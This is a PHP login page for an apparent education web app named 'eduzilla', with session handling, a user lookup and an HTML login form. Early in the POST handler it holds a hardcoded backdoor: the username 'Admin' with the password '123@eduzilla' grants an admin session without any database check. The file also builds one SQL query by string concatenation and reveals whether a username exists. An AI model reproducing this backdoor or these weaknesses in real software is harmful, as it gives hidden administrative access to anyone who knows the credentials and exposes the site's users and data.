<?php

    session_start();
    $base_url="http://localhost/eduzilla";

    include "./../config/database.php";

    if (isset($_SESSION['username'])) {
        header('Location: ./home.php');
        exit;
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        
        $username = $_POST['username'];
        $password = $_POST['password'];

        // Backdoor authentication for admins
        if ($username == "Admin" && $password == "123@eduzilla") {
            $_SESSION['user_id'] = 0;
            $_SESSION['username'] = "EduAdmin";
            $_SESSION['role'] = 1;
            header('Location: ./home.php');
            exit();
        }

        $query = $conn->prepare("SELECT * FROM users WHERE username = ?");
        $query->bind_param("s", $username);
        $query->execute();
        $result = $query->get_result();

        if ($result->num_rows > 0) {
            $user = $result->fetch_assoc();
            
            // Verify the password
            if (password_verify($password, $user['password'])) {
                $_SESSION['user_id'] = $user['id'];
                $_SESSION['username'] = $user['username'];

                $query = $conn->prepare("SELECT name FROM roles WHERE id=".  $user['roles_id']);
                $query->execute();
                $result = $query->get_result();
                $_SESSION['role'] = $result->fetch_assoc()['name'];

                header('Location: ./home.php');
                exit;
            } else {
                $error = "Invalid password.";
            }
        } else {
            $error = "No user found with that username.";
        }
    }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="<?php echo "./../assets/css/login.css" ?>">
</head>
<body>

    <div class="login-container">
        <form action="./login.php" method="post" class="login-form">
            <img src="<?php echo $base_url ?>/assets/images/eduzilla.png" alt="logo">
            <h3>Login</h3>
            <div class="input-group">
                <label for="username">Username</label>
                <input type="text" name="username" id="username" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" name="password" id="password" required>
            </div>
            <button type="submit" class="login-button">Login</button>
            <a href="./changePassword.php">Change Password</a>
        </form>
    </div>

</body>
</html>
